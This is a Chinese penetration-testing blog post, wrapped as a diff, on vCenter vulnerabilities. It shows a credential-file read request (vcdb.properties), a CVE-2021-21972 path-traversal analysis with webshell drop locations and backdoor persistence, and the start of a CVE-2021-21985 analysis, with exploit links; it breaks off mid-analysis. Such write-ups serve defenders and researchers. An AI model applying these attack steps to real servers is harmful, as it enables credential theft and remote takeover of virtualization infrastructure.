@@ -1,0 +1,830 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+        <title>vCenter 漏洞利用 - Geekby&#39;s Blog</title><meta name="Description" content="vCenter 漏洞利用"><meta property="og:title" content="vCenter 漏洞利用" />
+<meta property="og:description" content="vCenter 漏洞利用" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://www.geekby.site/2022/05/vcenter%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-05-05T15:23:00+08:00" />
+<meta property="article:modified_time" content="2022-05-08T15:23:00+08:00" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="vCenter 漏洞利用"/>
+<meta name="twitter:description" content="vCenter 漏洞利用"/>
+<meta name="application-name" content="Geekby&#39;s Blog">
+<meta name="apple-mobile-web-app-title" content="Geekby&#39;s Blog"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://www.geekby.site/2022/05/vcenter%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/" /><link rel="prev" href="https://www.geekby.site/2022/03/spring-beans-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "vCenter 漏洞利用",
+        "inLanguage": "zh-cn",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/www.geekby.site\/2022\/05\/vcenter%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8\/"
+        },"image": ["https:\/\/www.geekby.site\/logo.png"],"genre": "posts","keywords": "渗透测试","wordcount":  971 ,
+        "url": "https:\/\/www.geekby.site\/2022\/05\/vcenter%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8\/","datePublished": "2022-05-05T15:23:00+08:00","dateModified": "2022-05-08T15:23:00+08:00","publisher": {
+            "@type": "Organization",
+            "name": "Geekby","logo": {
+                    "@type": "ImageObject",
+                    "url": "https:\/\/www.geekby.site\/images\/avatar.png",
+                    "width":  358 ,
+                    "height":  330 
+                }},"author": {
+                "@type": "Person",
+                "name": "Geekby"
+            },"description": "vCenter 漏洞利用"
+    }
+    </script></head>
+    <body header-desktop="" header-mobile=""><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Geekby&#39;s Blog">Geekby&#39;s Blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/" title="文章"><i class="fas fa-inbox"></i> 文章 </a><a class="menu-item" href="/tags/" title="标签"><i class="fas fa-tags"></i> 标签 </a><a class="menu-item" href="/categories/" title="分类"><i class="fas fa-sort-amount-up-alt"></i> 分类 </a><a class="menu-item" href="/about/" title="关于"><i class="far fa-address-card"></i> 关于 </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="输入关键字" id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                    <i class="fas fa-adjust fa-fw"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Geekby&#39;s Blog">Geekby&#39;s Blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="输入关键字" id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        取消
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="文章"><i class="fas fa-inbox"></i>文章</a><a class="menu-item" href="/tags/" title="标签"><i class="fas fa-tags"></i>标签</a><a class="menu-item" href="/categories/" title="分类"><i class="fas fa-sort-amount-up-alt"></i>分类</a><a class="menu-item" href="/about/" title="关于"><i class="far fa-address-card"></i>关于</a><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                <i class="fas fa-adjust fa-fw"></i>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">目录</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animated flipInX">vCenter 漏洞利用</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw"></i>Geekby</a></span>&nbsp;<span class="post-category">收录于 <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"><i class="far fa-folder fa-fw"></i>渗透测试</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2022-05-05">2022-05-05</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 971 字&nbsp;
+                <i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 5 分钟&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>目录</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#1-vsphere-背景介绍">1 vSphere 背景介绍</a></li>
+    <li><a href="#2-常见漏洞">2 常见漏洞</a>
+      <ul>
+        <li><a href="#21-版本信息探测">2.1 版本信息探测</a></li>
+        <li><a href="#22-任意文件读取">2.2 任意文件读取</a></li>
+        <li><a href="#23-cve-2021-21972">2.3 CVE-2021-21972</a>
+          <ul>
+            <li><a href="#231-漏洞利用">2.3.1 漏洞利用</a></li>
+            <li><a href="#232-漏洞分析">2.3.2 漏洞分析</a></li>
+          </ul>
+        </li>
+        <li><a href="#24-cve-2021-21985">2.4 CVE-2021-21985</a>
+          <ul>
+            <li><a href="#241-漏洞利用">2.4.1 漏洞利用</a></li>
+            <li><a href="#242-漏洞分析">2.4.2 漏洞分析</a>
+              <ul>
+                <li><a href="#出网利用">出网利用</a></li>
+                <li><a href="#不出网利用">不出网利用</a></li>
+              </ul>
+            </li>
+          </ul>
+        </li>
+        <li><a href="#25-cve-2021-22005">2.5 CVE-2021-22005</a>
+          <ul>
+            <li><a href="#251-漏洞利用">2.5.1 漏洞利用</a></li>
+            <li><a href="#252-漏洞分析">2.5.2 漏洞分析</a>
+              <ul>
+                <li><a href="#asynctelemetrycontroller-漏洞">AsyncTelemetryController 漏洞</a></li>
+                <li><a href="#dataappagentcontroller-漏洞">DataAppAgentController 漏洞</a></li>
+              </ul>
+            </li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h1 id="vcenter-漏洞利用">vCenter 漏洞利用</h1>
+<h2 id="1-vsphere-背景介绍">1 vSphere 背景介绍</h2>
+<p>vSphere，ESXi 和 vCenter 辨析：</p>
+<ul>
+<li>VMware Inc</li>
+</ul>
+<p>**VMware Inc. ** 是一家软件公司。它开发了许多产品，尤其是各种云解决方案 。它的云解决方案包括云产品，数据中心产品和桌面产品等。</p>
+<ul>
+<li>vSphere</li>
+</ul>
+<p><strong>vSphere</strong> 是在数据中心产品下的一套软件。vSphere 类似微软的 Office 办公套件，Office 办公套件包含了许多软件如 Word，Excel，Access 等。和 Office 一样，vSphere 也是一个软件的集合。它包括了 vCenter Server， ESXi 和 vSphere client，是整套虚拟化部署方案的总和。</p>
+<ul>
+<li>ESXi</li>
+</ul>
+<p><strong>ESXi</strong> 是 vSphere 中最重要的一个组件。ESXi 是虚拟化服务。所有的虚拟机都是运行在 ESXi 服务上面。</p>
+<ul>
+<li>vSphere Client</li>
+</ul>
+<p><strong>vSphere (web) client</strong> 是一个管理平台，它能够直接管理多个不同的 ESXi 主机，包含许多进阶功能：集群故障转移等。而 ESXi 自带的管理平台只能管理自身所处的 ESXi 主机。而 vSphere client 有更加详细的性能监控，批量更新接管所有 ESXi 系统版本。通过资源池也可以规划虚拟机资源占用。</p>
+<ul>
+<li>vCenter Server</li>
+</ul>
+<p>在 ESXi 6.0 之前是通过 C/S 架构来管理 ESXi 集群的，没有 web 端，且安装环境较为苛刻，必须为 Server 版本的服务器才可以安装。在 6.0 版本之后，官方已经取消了 C/S 架构的客户端，转而采用了 web 管理平台，又被称之为  vSphere web client。而部署了 vSphere web client 的服务器被称之为 <strong>vCenter Server</strong>。</p>
+<p>官方推荐将打包好的 Client 与 Server 应用部署在 VMware 自家的 Photon 系统下，其安装包命名为：VMware vCenter Server Appliance，简称为：<strong>VCSA</strong>。</p>
+<h2 id="2-常见漏洞">2 常见漏洞</h2>
+<h3 id="21-版本信息探测">2.1 版本信息探测</h3>
+<p>通过调用 VMWare Sphere 组件的 SOAP API，可以获取其版本信息，XML 数据如下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="cp">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;soap:Envelope</span>
+</span></span><span class="line"><span class="cl">    <span class="na">xmlns:soap=</span><span class="s">&#34;http://schemas.xmlsoap.org/soap/envelope/&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="na">xmlns:xsd=</span><span class="s">&#34;http://www.w3.org/2001/XMLSchema&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="na">xmlns:xsi=</span><span class="s">&#34;http://www.w3.org/2001/XMLSchema-instance&#34;</span><span class="nt">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;soap:Header&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&lt;operationID&gt;</span>00000001-00000001<span class="nt">&lt;/operationID&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/soap:Header&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;soap:Body&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&lt;RetrieveServiceContent</span>
+</span></span><span class="line"><span class="cl">            <span class="na">xmlns=</span><span class="s">&#34;urn:internalvim25&#34;</span><span class="nt">&gt;</span>
+</span></span><span class="line"><span class="cl">            <span class="nt">&lt;_this</span> <span class="na">xsi:type=</span><span class="s">&#34;ManagedObjectReference&#34;</span> <span class="na">type=</span><span class="s">&#34;ServiceInstance&#34;</span><span class="nt">&gt;</span>ServiceInstance<span class="nt">&lt;/_this&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&lt;/RetrieveServiceContent&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/soap:Body&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;/soap:Envelope&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205061715861.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205061715861.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205061715861.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205061715861.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205061715861.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205061715861.png-water_print" /></p>
+<p>Nuclei 相关模板：</p>
+<ul>
+<li><code>/nuclei-templates/technologies/vmware/vmware-detect.yaml</code></li>
+</ul>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205061717231.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205061717231.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205061717231.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205061717231.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205061717231.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205061717231.png-water_print" /></p>
+<h3 id="22-任意文件读取">2.2 任意文件读取</h3>
+<p>影响版本：<code>Vmware vCenter Server &lt;= 6.5.0</code></p>
+<p>Fofa Dork：<code>title=&quot;ID_VC_Welcome&quot;</code></p>
+<p>VMware vCenter 存在任意文件读取漏洞，可读取 vCenter 配置文件获得管理帐号密码进而控制 vCenter 平台及其管理的虚拟机集群。</p>
+<p>由于 EAM 用户运行该存在漏洞的服务（非域用户），因此不存在 NTLM Relay 等中继攻击风险。</p>
+<p>由于不同的系统版本，数据库配置文件（<code>vcdb.properties</code>）存放位置不同，根据<a href="https://kb.vmware.com/s/article/7960893?lang=zh_cn" target="_blank" rel="noopener noreffer">官方文档</a>，大体可以分为：</p>
+<ul>
+<li>对于 vCenter Server 5.5 及更低版本：
+<ul>
+<li>Windows 2008 -  <code>C:\ProgramData\VMware\VMware VirtualCenter</code></li>
+<li>其他 Windows 版本 - <code>C:\Documents and Settings\All Users\Application Data\VMware\VMware VirtualCenter\</code></li>
+</ul>
+</li>
+<li>对于 vCenter Server 6.0、6.5、6.7：
+<ul>
+<li><code>C:\ProgramData\VMware\vCenterServer\cfg\vmware-vpx</code></li>
+</ul>
+</li>
+</ul>
+<p>POC：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="nf">GET</span> <span class="nn">/eam/vib?id={{path}}\vcdb.properties</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+</span></span><span class="line"><span class="cl"><span class="n">Host</span><span class="o">:</span> <span class="l">{{Hostname}}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>nuclei 中对应的 poc：</p>
+<ul>
+<li><code>/nuclei-templates/vulnerabilities/vmware/vmware-vcenter-lfi.yaml</code></li>
+<li><code>/nuclei-templates/vulnerabilities/vmware/vmware-vcenter-lfi-linux.yaml</code></li>
+</ul>
+<h3 id="23-cve-2021-21972">2.3 CVE-2021-21972</h3>
+<h4 id="231-漏洞利用">2.3.1 漏洞利用</h4>
+<p>默认启用的 vROps 插件（com.vmware.vropspluginui.mvc）ServicesController 类的 uploadova 接口存在未授权访问，可利用路径穿越将文件解压至特定目录实现 getshell。</p>
+<p>影响版本：</p>
+<ul>
+<li><code>7.0 &lt;= vCenter Server &lt; 7.0 U1c</code></li>
+<li><code>6.7 &lt;= vCenter Server &lt; 6.7 U3l</code></li>
+<li><code>6.5 1e &lt;= vCenter Server &lt; 6.5 U3n</code></li>
+<li><code>4.x &lt;= Cloud Foundation (vCenter Server) &lt; 4.2</code></li>
+<li><code>3.x &lt;= Cloud Foundation (vCenter Server) &lt; 3.10.1.2</code></li>
+</ul>
+<p>POC：</p>
+<ul>
+<li><code>/nuclei-templates/cves/2021/CVE-2021-21972.yaml</code></li>
+</ul>
+<p>EXP：</p>
+<ul>
+<li><a href="https://www.exploit-db.com/exploits/49602" target="_blank" rel="noopener noreffer">https://www.exploit-db.com/exploits/49602</a></li>
+</ul>
+<h4 id="232-漏洞分析">2.3.2 漏洞分析</h4>
+<p>定位到存在漏洞的 Jar 包：<code>/etc/vmware/vsphere-ui/vc-packages/vsphere-client-serenity/com.vmware.vrops.install-6.x.x.xx000/plugins/vropsplugin-service.jar</code></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205061949834.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205061949834.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205061949834.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205061949834.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205061949834.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205061949834.png-water_print" /></p>
+<p>注意到第 463 行，直接将 TAR 的文件名与 <code>/tmp/unicorn_ova_dir</code> 拼接并写入文件。如果文件名内存在 <code>../</code>，可将文件解压至 <code>vsphere-ui</code> 用户有权限的目录。切入该用户并查找可写目录：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">su vsphere-ui
+</span></span><span class="line"><span class="cl">find / -writable -type d <span class="p">|&amp;</span> grep -v <span class="s2">&#34;Permission denied&#34;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>其中 <code>.ssh</code> 目录可写，因此，最为常见的思路就是写入公钥，并利用该用户登录。但是该方式存在一定的局限，首先看一下 shadow 文件：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205061953700.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205061953700.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205061953700.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205061953700.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205061953700.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205061953700.png-water_print" /></p>
+<p>看到密码过期时间为 90 天，因此在安装 90 天后即使写入了公钥登录也会提示密码过期，需要提供原密码并修改密码。此外，<code>vsphere-ui</code> 用户的第二项为 <code>!</code>，这表示该用户未设置密码（与空密码不同），所以也就没法修改密码，因此，当密钥过期后，就无法再次登录。</p>
+<p>另一种思路就是写入 Webshell。首先需要遍历找出存在有 jsp 的 web.xml 并且目录可写：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">grep <span class="s2">&#34;&lt;servlet-name&gt;jsp&lt;/servlet-name&gt;&#34;</span> <span class="k">$(</span>find / -name <span class="s2">&#34;*web.xml&#34;</span><span class="k">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>最终确定了如下几个 linux 下的存放位置：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># vCenter 6.5/6.7 &lt; 13010631</span>
+</span></span><span class="line"><span class="cl">/usr/lib/vmware-vsphere-ui/server/work/deployer/s/global/%d/0/h5ngc.war/resources/&lt;thefile&gt;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># vCenter 6.7 &gt;= 13010631</span>
+</span></span><span class="line"><span class="cl">/usr/lib/vmware-vsphere-ui/server/static/resources/libs/&lt;thefile&gt;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># vCenter 7.0，其中 resources15863815 动态生成，可以通过访问 /ui 可以获取该目录信息</span>
+</span></span><span class="line"><span class="cl">/usr/lib/vmware-vsphere-ui/server/static/resources15863815/libs/&lt;thefile&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>由 <code>/usr/lib/vmware-vsphere-ui/server/configuration/tomcat-server.xml</code> 查到监听端口为 5090，再由 rhttpproxy 反向代理找到 web 访问路径：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205062006466.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205062006466.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205062006466.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205062006466.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205062006466.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205062006466.png-water_print" /></p>
+<p>最后将 webshell 释放至 <code>/usr/lib/vmware-vsphere-ui/server/work/deployer/s/global/xx/0/h5ngc.war/resources/</code> 目录或其子目录，即可解析并由 <code>https://IP/ui/resources/webshell.jsp</code> 访问</p>
+<p>该路径中的 xx 并非是固定数值，会随着重装重启等行为发生改变，所以构造上传包时可以暴力批量添加，并探测是否上传成功。</p>
+<p>此外，6.7U2 及之后的版本，会在服务启动时判断如果存在 work 目录就删除，也就是说 Web 是跑在内存里面的。这时对于 6.7U2 及更新的 6.7 版本可以将 webshell 释放至 <code>/usr/lib/vmware-vsphere-ui/server/static/resources/libs/</code> 目录作为后门，待其重启后会被加载运行。对于 7.0 版本 static 后面的 resources 会跟一串动态数字路径，能够在请求的返回包中获取到。</p>
+<p>针对 Windows 版本，可以在目标服务器上写入 JSP webshell 文件，由于服务是 System 权限，所以可以任意文件写。常用的目录为：<code>C:\ProgramData\VMware\vCenterServer\data\perfcharts\tc-instance\webapps\statsreport\</code>，访问 <code>https://IP/statsreport/xxx.jsp</code> 即可。</p>
+<p>其它常见路径可以参考：<a href="https://daidaitiehanhan.github.io/2022/04/18/vCenter2021%e5%87%a0%e4%b8%aa%e6%bc%8f%e6%b4%9e%e5%8f%8a%e5%90%8e%e6%b8%97%e9%80%8f/" target="_blank" rel="noopener noreffer">vCenter2021几个漏洞及后渗透</a></p>
+<h3 id="24-cve-2021-21985">2.4 CVE-2021-21985</h3>
+<h4 id="241-漏洞利用">2.4.1 漏洞利用</h4>
+<p>默认启用的 Virtual SAN Health Check 插件（vsan-h5-client.zip）<code>/rest/* </code>接口存在未授权访问，可利用不安全的反射调用实现 RCE。</p>
+<p>影响版本：</p>
+<ul>
+<li>7.0 &lt;= vCenter Server &lt; 7.0 U2b</li>
+<li>6.7 &lt;= vCenter Server &lt; 6.7 U3n</li>
+<li>6.5 &lt;= vCenter Server &lt; 6.5 U3p</li>
+<li>4.x &lt;= Cloud Foundation (vCenter Server) &lt; 4.2.1</li>
+<li>3.x &lt;= Cloud Foundation (vCenter Server) &lt; 3.10.2.1</li>
+</ul>
+<p>POC：</p>
+<ul>
+<li><code>/nuclei-templates/cves/2021/CVE-2021-21985.yaml</code></li>
+</ul>
+<p>EXP：</p>
+<ul>
+<li><a href="https://github.com/r0ckysec/CVE-2021-21985" target="_blank" rel="noopener noreffer">https://github.com/r0ckysec/CVE-2021-21985</a></li>
+</ul>
+<h4 id="242-漏洞分析">2.4.2 漏洞分析</h4>
+<h5 id="出网利用">出网利用</h5>
+<p>首先定位到 <code>vsan-h5-client</code> 插件存放位置：<code>find / -name '*vsan*' | grep 'h5'</code>，最终确定在 <code>/usr/lib/vmware-vpx/vsan-health/ui-plugins/vsan-h5-client.zip</code> 目录下。</p>
+<p>下载，解压并反编译其中的 jar 包，由于漏洞情报中描述为未授权访问，首先在 <code>h5-vsan-context.jar</code> 的  <code>web.xml</code> 中寻找相关线索，在已经修复的版本中，已经添加了相应的 filter：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205071631304.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205071631304.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205071631304.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205071631304.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205071631304.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205071631304.png-water_print" /></p>
+<p>在 <code>h5-vsan-service.jar</code> 中找到 <code>com.vmware.vsan.client.services.AuthenticationFilter</code>，如果未认证，则直接返回 401。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205071634089.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205071634089.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205071634089.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205071634089.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205071634089.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205071634089.png-water_print" /></p>
+<p>另一处变动在 <code>h5-vsan-service.jar</code> 中 <code>ProxygenController</code> 类的 <code>invokeService</code> 方法：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205071637502.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205071637502.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205071637502.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205071637502.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205071637502.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205071637502.png-water_print" /></p>
+<p>添加了校验，检测反射调用的方法是否为带有 <code>TsService</code> 注解，启用了白名单机制。因此基本可以确定漏洞点位于该类中。</p>
+<p><code>TsService</code> 注解源码：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205071639053.png-water_print"
